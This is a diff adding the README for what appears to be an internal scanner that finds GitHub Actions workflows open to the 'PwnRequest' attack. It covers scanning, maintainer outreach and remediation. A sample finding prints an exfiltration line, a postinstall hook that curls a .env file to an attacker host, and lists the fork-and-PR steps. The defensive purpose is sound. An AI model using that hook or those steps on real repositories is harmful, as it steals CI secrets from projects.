@@ -1,0 +1,891 @@
+= GitHub Actions PwnRequest Vulnerability Scanner
+:toc:
+:toc-placement!:
+:sectnums:
+:icons: font
+:source-highlighter: pygments
+
+A comprehensive toolkit for detecting, analyzing, and triaging GitHub Actions workflows vulnerable to the "PwnRequest" attack pattern.
+
+toc::[]
+
+[[overview]]
+== Overview
+
+CAUTION: This tool identifies a critical security vulnerability. Use findings responsibly and follow responsible disclosure practices.
+
+This scanner identifies GitHub Actions workflows that are vulnerable to the **PwnRequest** attack, which occurs when:
+
+1. A workflow uses the `pull_request_target` trigger (runs with write permissions and secrets)
+2. It checks out untrusted PR code (`head.ref`, `head.sha`, or `merge_commit_sha`)
+3. It executes code from that checkout (npm, make, pip, docker build, etc.)
+
+An attacker can fork the repository, modify build files to exfiltrate secrets, and open a PR to trigger the vulnerable workflow.
+
+TIP: Read the https://securitylab.github.com/research/github-actions-preventing-pwn-requests/[official research] for detailed threat modeling.
+
+// Visual diagram of the attack flow
+[[attack-flow]]
+=== Attack Flow Diagram
+
+----
+Attacker forks repo
+       |
+       v
+Modifies package.json / Makefile
+       |
+       v
+Opens PR to target repo
+       |
+       v
+Trigger: pull_request_target (with secrets!)
+       |
+       v
+Checkout: ${{ github.event.pull_request.head.sha }} (attacker code)
+       |
+       v
+Execute: npm install / make build (runs attacker code)
+       |
+       v
+Exfiltrate secrets to attacker server
+----
+
+[[quick-start]]
+== Quick Start
+
+Get started in 4 commands:
+
+[source,bash]
+----
+# 1. Create input file with GitHub repo URLs (one per line)
+echo "https://github.com/your-org/your-repo" > repos.txt
+
+# 2. Clone .github folders from all repos
+uv run scripts/clone_repos.py repos.txt
+
+# 3. Scan for vulnerabilities
+uv run scripts/scan_repos_async.py
+
+# 4. Review results
+cat vulnerabilities.csv
+----
+
+TIP: Use `just scan` for the complete scanning workflow.
+
+// Interactive collapsible for prerequisites
+[details="Need help getting started?"]
+--
+See <<development,Development>> for prerequisites and setup instructions.
+--
+
+// Better pipeline visualization with icons
+[[workflow-pipeline]]
+== Workflow Pipeline
+
+image::https://img.shields.io/badge/Phase-Discovery-blue["Phase 1"] →
+image::https://img.shields.io/badge/Phase-Clone-green["Phase 2"] →
+image::https://img.shields.io/badge/Phase-Scan-orange["Phase 3"] →
+image::https://img.shields.io/badge/Phase-Maintainers-red["Phase 4"] →
+image::https://img.shields.io/badge/Phase-AI-purple["Phase 5"] →
+image::https://img.shields.io/badge/Phase-Outreach-yellow["Phase 6"]
+
+The full analysis pipeline consists of six phases:
+
+[cols="1,1,1"]
+|===
+|Phase |Output |Command
+
+|Phase 1
+|`repos.txt`
+|`uv run scripts/scraper.py --orgs org1 org2`
+
+|Phase 2
+|`scan-output.txt/`
+|`uv run scripts/clone_repos.py repos.txt`
+
+|Phase 3
+|`vulnerabilities.csv`
+|`uv run scripts/scan_repos_async.py`
+
+|Phase 4
+|`pr-mergers.csv`
+|`uv run scripts/find-pr-mergers.py`
+
+|Phase 5
+|`confirmed_vulnerable.txt`
+|`./analyze_repos.sh`
+
+|Phase 6
+|`repo-contributors-active.tsv`
+|`./lookup_ldap.sh`
+|===
+
+[[phase1]]
+=== Phase 1: Repository Discovery
+
+Find repositories in GitHub organizations that use `pull_request_target`:
+
+[source,bash]
+----
+# Scan GitHub organizations for repos with pull_request_target workflows
+uv run scripts/scraper.py --orgs org1 org2 org3 > repos.txt
+
+# Or scan from a file of organization names
+uv run scripts/scraper.py --orgs-file orgs.txt > repos.txt
+
+# Filter for specific repositories (e.g., only production)
+uv run scripts/scraper.py --orgs org1 --archived false --fork false > repos.txt
+----
+
+**Output:** `repos.txt` - List of GitHub repository URLs (one per line)
+
+[source,bash]
+----
+https://github.com/redhat-developer/rhdh
+https://github.com/openshift/kubernetes
+https://github.com/konflux-ci/konflux-ui
+----
+
+NOTE: The scraper uses GitHub GraphQL API and requires `gh` CLI authentication.
+
+[[phase2]]
+=== Phase 2: Clone Workflow Files
+
+Sparse-clone only the `.github/` folder from each repository for efficiency:
+
+[source,bash]
+----
+# Clone all repos (uses sparse-checkout for efficiency)
+uv run scripts/clone_repos.py repos.txt
+
+# Limit to first N repos for testing
+uv run scripts/clone_repos.py repos.txt --limit 50
+
+# Specify output directory
+uv run scripts/clone_repos.py repos.txt --output-dir scan-output.txt
+
+# Control parallelism (default: 16 workers)
+uv run scripts/clone_repos.py repos.txt --workers 32
+----
+
+**Output:** `scan-output.txt/{org}/{repo}/{branch}/.github/workflows/*.yml`
+
+The scanner clones each branch as a separate directory to analyze all workflow versions.
+
+WARNING: Cloning large numbers of repositories can consume significant disk space and network bandwidth.
+
+[[phase3]]
+=== Phase 3: Vulnerability Scanning
+
+Scan cloned workflows for PwnRequest vulnerabilities:
+
+[source,bash]
+----
+# Full scan (recommended - async for performance)
+uv run scripts/scan_repos_async.py
+
+# Refresh git worktrees before scanning
+uv run scripts/scan_repos_async.py --refresh-worktrees
+
+# Limit scan for testing
+uv run scripts/scan_repos_async.py --limit 100
+
+# Using justfile
+just scan
+
+# Scan specific repo only
+uv run scripts/scan_repos_async.py --repo redhat-developer/rhdh
+----
+
+**Output:** `vulnerabilities.csv`
+
+// Better formatted table with alignment and descriptions
+[cols="1,3,1"]
+|===
+|Column |Description |Example
+
+|`org`
+|GitHub organization
+|`redhat-developer`
+
+|`repo`
+|Repository name
+|`rhdh`
+
+|`branch`
+|Branch name where vulnerability exists
+|`main`
+
+|`workflow_file`
+|Workflow filename
+|`ci.yml`
+
+|`job_name`
+|Name of the vulnerable job
+|`build-and-test`
+
+|`checkout_line`
+|Line number of untrusted checkout
+|`42`
+
+|`checkout_ref`
+|The dangerous ref being checked out
+|`${{ github.event.pull_request.head.sha }}`
+
+|`exec_line`
+|Line number of code execution
+|`47`
+
+|`exec_type`
+|Type: `build_command` or `local_action`
+|`build_command`
+
+|`exec_value`
+|The command/action being executed
+|`npm install`
+
+|`protection`
+|Protection level
+|`none`
+
+|`protection_detail`
+|Description of any protection mechanism
+|No protections in place
+
+|`github_url`
+|Direct link to the vulnerable line
+|`https://github.com/...`
+
+|`workflow_path`
+|Local path to workflow file
+|`scan-output.txt/redhat-developer/rhdh/main/.github/workflows/ci.yml`
+|===
+
+**Protection Levels:**
+
+[cols="1,2"]
+|===
+|Level |Description
+
+|`none`
+|Fully exploitable, any PR can trigger
+
+|`label`
+|Requires maintainer to add label (social engineering vector)
+
+|`permission`
+|Requires PR author to have write/admin access
+
+|`same_repo`
+|Only runs for PRs from same repo (not forks)
+|===
+
+[details="View sample vulnerability output"]
+--
+[source,csv]
+----
+org,repo,branch,workflow_file,job_name,checkout_line,checkout_ref,exec_line,exec_type,exec_value,protection,protection_detail
+redhat-developer,rhdh,main,ci.yml,build,42,${{ github.event.pull_request.head.sha }},47,build_command,npm install,none,No protections in place
+----
+--
+
+[[phase4]]
+=== Phase 4: Find Maintainers
+
+Identify who merges PRs in vulnerable repositories (for outreach):
+
+[source,bash]
+----
+# Get PR merger information
+uv run scripts/find-pr-mergers.py vulnerabilities.csv pr-mergers.csv
+
+# Add merger info to vulnerability data
+uv run scripts/add-mergers-to-vulnerabilities.py
+
+# View top maintainers
+head -20 pr-mergers.csv
+----
+
+**Output:**
+
+* `pr-mergers.csv` - GitHub users who merge PRs per repo
+* `vulnerabilities-with-mergers.csv` - Vulnerabilities with maintainer info
+
+[details="View sample PR merger output"]
+--
+[source,csv]
+----
+org,repo,merger_login,merger_name,mergers_count
+redhat-developer,rhdh,janedoe,Jane Doe,42
+redhat-developer,rhdh,bobsmith,Bob Smith,28
+----
+--
+
+[[phase5]]
+=== Phase 5: AI-Assisted Confirmation
+
+Use Claude to manually confirm vulnerabilities and document exploitation:
+
+[source,bash]
+----
+# Analyze all repositories with vulnerable workflows
+./analyze_repos.sh
+
+# The script runs Claude on each repo to:
+# - Confirm the vulnerability is real (not false positive)
+# - Document specific exploitation steps
+# - Identify secrets at risk
+
+# Analyze specific repo only
+./analyze_repos.sh redhat-developer/rhdh
+----
+
+**Output:** Per-repo analysis files in `scan-output.txt/{org}/{repo}/`:
+
+* `confirmed_vulnerable.txt` - Exploitable without approval gates
+* `confirmed_weakness.txt` - Exploitable but requires label/approval
+* `not_vulnerable.txt` - False positive (scanner improvement needed)
+
+[details="View sample confirmed vulnerability"]
+--
+----
+## Vulnerability Confirmed
+
+**Workflow:** .github/workflows/ci.yml
+**Job:** build-and-test
+**Severity:** HIGH
+
+### Attack Vector
+1. Attacker forks repo and modifies package.json:
+   ```json
+   {
+     "scripts": {
+       "postinstall": "curl -d @.env https://attacker-server.com/steal"
+     }
+   }
+   ```
+
+2. Opens PR to trigger pull_request_target
+
+3. Workflow runs with secrets and executes:
+   - npm install (runs postinstall hook)
+   - Exfiltrates all repository secrets
+
+### Secrets at Risk
+- NPM_TOKEN
+- DEPLOY_KEY
+- DATABASE_URL
+
+### Recommended Fix
+Use workflow_run trigger instead of pull_request_target.
+----
+--
+
+**Viewing Results:**
+
+[source,bash]
+----
+# Find all confirmed vulnerabilities
+find scan-output.txt -name 'confirmed_vulnerable.txt'
+
+# Count confirmed vulnerabilities
+find scan-output.txt -name 'confirmed_vulnerable.txt' | wc -l
+
+# View a specific analysis
+cat scan-output.txt/redhat-developer/rhdh/confirmed_vulnerable.txt
+
+# Get summary across all repos
+./analyze_repos.sh --summary
+----
+
+[[phase6]]
+=== Phase 6: Contributor Outreach (Red Hat specific)
+
+For Red Hat repositories, identify active employees to contact:
+
+[source,bash]
+----
+# Step 1: Get contributors for specific repos
+gh api repos/redhat-developer/rhdh/contributors > repo-contributors.json
+
+# Step 2: Filter for Red Hat emails
+gh api repos/redhat-developer/rhdh/contributors | jq -r '.[].login' | while read user; do
+  gh api users/$user | jq -r 'select(.email | contains("redhat.com"))'
+done > repo-contributors-redhat.tsv
+
+# Step 3: Verify active employees via LDAP
+./lookup_ldap.sh
+
+# Output: repo-contributors-redhat-ldap.tsv with LDAP status
+----
+
+**Output Files:**
+
+* `repo-contributors.tsv` - All contributors
+* `repo-contributors-redhat.tsv` - Red Hat email addresses only
+* `repo-contributors-redhat-ldap.tsv` - With LDAP verification
+* `repo-contributors-active.tsv` - Verified active employees only
+
+[details="LDAP lookup configuration"]
+--
+Edit `lookup_ldap.sh` to configure your LDAP server:
+
+[source,bash]
+----
+LDAP_SERVER="ldap://ldap.redhat.com"
+LDAP_BASE="dc=redhat,dc=com"
+LDAP_FILTER="(mail=*)"
+----
+--
+
+// Better file reference with quick links
+[[file-reference]]
+== File Reference
+
+=== Scripts
+
+[cols="1,3,1"]
+|===
+|Script |Purpose |Runtime
+
+|`scripts/scraper.py`
+|Scan GitHub orgs for repos using pull_request_target
+|~2 min/100 repos
+
+|`scripts/clone_repos.py`
+|Sparse-clone .github folders from repos
+|~10 min/100 repos
+
+|`scripts/scan_repos_async.py`
+|Main vulnerability scanner (async)
+|~1 min/100 repos
+
+|`scripts/pwn_request_detector.py`
+|Core detection logic for PwnRequest pattern
+|N/A (library)
+
+|`scripts/find-pr-mergers.py`
+|Get PR merger information via GitHub GraphQL
+|~5 min/100 repos
+
+|`scripts/add-mergers-to-vulnerabilities.py`
+|Merge vulnerability and maintainer data
+|~30 sec
+
+|`scripts/parse_vulnerabilities_csv.py`
+|Helper to parse CSV for shell scripts
+|N/A (library)
+
+|`analyze_repos.sh`
+|AI-assisted vulnerability confirmation
+|~2 min/repo
+
+|`lookup_ldap.sh`
+|LDAP lookup for Red Hat employees
+|~1 sec/user
+|===
+
+=== Data Files (gitignored - generated)
+
+[cols="1,3,2"]
+|===
+|File |Contents |Size (typical)
+
+|`repos.txt`
+|Input: GitHub repo URLs to scan
+|1 KB - 10 MB
+
+|`vulnerabilities.csv`
+|Raw scanner output
+|10 KB - 5 MB
+
+|`pr-mergers.csv`
+|PR merger info per repo
+|5 KB - 2 MB
+
+|`vulnerabilities-with-mergers.csv`
+|Combined vulnerability + maintainer data
+|15 KB - 7 MB
+
+|`repo-mergers.tsv`
+|Unique maintainers per repo (TSV format)
+|5 KB - 1 MB
+
+|`repo-contributors-*.tsv`
+|Contributor tracking for outreach
+|10 KB - 3 MB
+|===
+
+=== Directories
+
+[cols="1,3,2"]
+|===
+|Directory |Contents |Size (typical)
+
+|`scan-output.txt/`
+|Cloned workflow files: `{org}/{repo}/{branch}/.github/`
+|100 MB - 10 GB
+
+|`vulnerable-workflows/`
+|Example vulnerable workflows for reference
+|1 MB
+
+|`.worktrees/`
+|Git worktrees for branch scanning
+|500 MB - 5 GB
+
+|`scripts/`
+|All Python and shell scripts
+|100 KB
+|===
+
+// More detailed detection logic with examples
+[[detection-logic]]
+== Detection Logic
+
+The scanner (`pwn_request_detector.py`) looks for three conditions in the same job:
+
+=== 1. Trigger: pull_request_target
+
+[source,yaml]
+----
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+----
+
+WARNING: This trigger runs with repository secrets and write permissions, even from forked PRs.
+
+=== 2. Checkout: Untrusted PR Code
+
+[source,yaml]
+----
+- uses: actions/checkout@v4
+  with:
+    ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
+----
+
+**Dangerous refs:**
+
+[cols="1,2"]
+|===
+|Ref |Risk
+
+|`github.event.pull_request.head.sha`
+|Checks out attacker's commit
+
+|`github.event.pull_request.head.ref`
+|Checks out attacker's branch
+
+|`github.event.pull_request.merge_commit_sha`
+|Checks out merge commit
+
+|`github.head_ref`
+|Alternative syntax for head.ref
+|===
+
+NOTE: Even if you validate the ref later, the checkout has already fetched untrusted code.
+
+=== 3. Execute: Code from Checkout
+
+[source,yaml]
+----
+- run: npm install  # Executes attacker-controlled package.json
+- run: make build   # Executes attacker-controlled Makefile
+- uses: ./action    # Executes local action from checkout
+----
+
+**Dangerous commands include:**
+
+* Package managers: `npm`, `yarn`, `pnpm`, `pip`, `poetry`, `cargo`, `go`
+* Build tools: `make`, `gradle`, `mvn`, `bazel`, `cmake`
+* Docker: `docker build`, `docker-compose`
+* Scripts: `./script.sh`, `bash script`, `python script.py`
+* Actions: `./action`, `actions/github-script` with unsafe inputs
+
+CAUTION: Any command that reads files from the checkout is potentially dangerous.
+
+// Enhanced remediation with before/after examples
+[[remediation]]
+== Remediation
+
+=== Option 1: Use workflow_run (Recommended)
+
+Split into two workflows:
+
+.Before (Vulnerable)
+[source,yaml]
+----
+on: pull_request_target
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm install
+      - run: npm test
+      - run: npm run deploy
+        env:
+          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}  # STOLEN!
+----
+
+.After (Secure)
+[source,yaml]
+----
+# .github/workflows/pr-build.yml (runs on PR with limited permissions)
+on: pull_request
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm install
+      - run: npm test
+
+# .github/workflows/pr-deploy.yml (runs after build completes)
+on:
+  workflow_run:
+    workflows: ["PR Build"]
+    types: [completed]
+jobs:
+  deploy:
+    if: ${{ github.event.workflow_run.conclusion == 'success' }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.workflow_run.head_sha }}
+      - run: npm run deploy
+        env:
+          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}  # SAFE - only runs on successful build
+----
+
+TIP: The build workflow has no access to secrets. The deploy workflow only runs after the build succeeds.
+
+=== Option 2: Only Checkout Trusted Code
+
+[source,yaml]
+----
+on: pull_request_target
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.base.sha }}  # Base branch, not PR
+      - run: npm install
+      - run: npm test
+----
+
+WARNING: This doesn't test the PR changes, only the base branch.
+
+=== Option 3: Require Labels for Execution
+
+[source,yaml]
+----
+jobs:
+  build:
+    if: contains(github.event.pull_request.labels.*.name, 'safe-to-test')
+    steps:
+      # Only runs if maintainer added 'safe-to-test' label
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm test
+----
+
+NOTE: This is still a social engineering vector but reduces risk.
+
+// Better development section with troubleshooting
+[[development]]
+== Development
+
+=== Prerequisites
+
+* Python 3.11+
+* https://github.com/astral-sh/uv[uv] for Python package management
+* `gh` CLI (authenticated)
+* `git`
+* `jq`
+
+=== Setup
+
+[source,bash]
+----
+# Clone this repo
+git clone <repo-url>
+cd actions-scanner
+
+# Install dependencies
+uv sync
+
+# Authenticate GitHub CLI
+gh auth login
+
+# Verify setup
+uv run python --version
+gh auth status
+----
+
+=== Running Tests
+
+[source,bash]
+----
+# Run unit tests (if using Semgrep rules)
+just test-unit
+
+# Run integration tests
+just test-integration
+
+# Validate rule syntax
+just validate
+
+# Run specific test
+uv run pytest tests/test_pwn_request_detector.py -v
+----
+
+=== Environment Variables
+
+[cols="1,2"]
+|===
+|Variable |Description
+
+|`GITHUB_TOKEN`
+|GitHub personal access token (for gh CLI)
+
+|`ANTHROPIC_API_KEY`
+|Claude API key (for AI analysis)
+
+|`SCAN_WORKERS`
+|Number of parallel workers (default: 16)
+
+|`SCAN_LIMIT`
+|Maximum repos to scan (default: unlimited)
+|===
+
+=== Troubleshooting
+
+[details="Common Issues"]
+--
+**Issue:** `gh: authentication failed`
+
+Solution:
+[source,bash]
+----
+gh auth login
+# Follow prompts to authenticate
+----
+
+**Issue:** `Permission denied: './analyze_repos.sh'`
+
+Solution:
+[source,bash]
+----
+chmod +x analyze_repos.sh
+----
+
+**Issue:** `uv: command not found`
+
+Solution:
+[source,bash]
+----
+# Install uv
+curl -LsSf https://astral.sh/uv/install.sh | sh
+----
+
+**Issue:** Scanner finds no vulnerabilities but you know they exist
+
+Solution:
+[source,bash]
+----
+# Check if workflows were cloned
+ls scan-output.txt/
+
+# Refresh git worktrees
+uv run scripts/scan_repos_async.py --refresh-worktrees
+
+# Check scanner logs
+uv run scripts/scan_repos_async.py --verbose
+----
+
+**Issue:** Memory error when scanning many repos
+
+Solution:
+[source,bash]
+----
+# Reduce worker count
+uv run scripts/scan_repos_async.py --workers 4
+
+# Scan in batches
+head -100 repos.txt > repos-batch1.txt
+uv run scripts/scan_repos_async.py --input repos-batch1.txt
+----
+--
+
+=== Performance Tips
+
+[cols="1,2"]
+|===
+|Tip |Impact
+
+|Use `--refresh-worktrees` only when needed
+|Saves 30-50% scan time
+
+|Increase workers on fast machines
+|2-4x faster (32 workers)
+
+|Use `--limit` for testing
+|Quick feedback loop
+
+|Cache GitHub API responses
+|Reduce API rate limit issues
+|===
+
+// Better references with descriptions
+[[references]]
+== References
+
+* https://securitylab.github.com/research/github-actions-preventing-pwn-requests/[GitHub Security Lab: Preventing pwn requests] - Original research and threat model
+* https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions[GitHub Docs: Security hardening for GitHub Actions] - Official security guidelines
+* https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability[Legit Security: GitHub Privilege Escalation] - Real-world attack examples
+* https://github.com/ossf/scorecard[OpenSSF Scorecard] - Automated security checks for GitHub projects
+* https://docs.github.com/en/actions/security-guides/encrypted-secrets[GitHub Docs: Encrypted Secrets] - How to protect secrets in workflows
+
+// Glossary for technical terms
+[[glossary]]
+== Glossary
+
+[cols="1,2"]
+|===
+|Term |Definition
+
+|`pull_request_target`
+|GitHub Actions trigger that runs with repository permissions and secrets, even from forked PRs
+
+|PwnRequest
+|Attack pattern exploiting pull_request_target to steal secrets by running untrusted code
+
+|Social Engineering
+|Attack technique that manipulates people into performing actions or divulging information
+
+|Sparse Checkout
+|Git feature to clone only specific directories (used here to get only .github/ folders)
+
+|Worktree
+|Git feature to checkout multiple branches simultaneously in the same repository
+|===
+
+== License
+
+Internal use only.
+
+// Footer with links
+////
+Need help?
+- Check the <<detection-logic,Detection Logic>> for technical details
+- See <<remediation,Remediation>> for fixes
+- Review <<development,Troubleshooting>> for common issues
+////
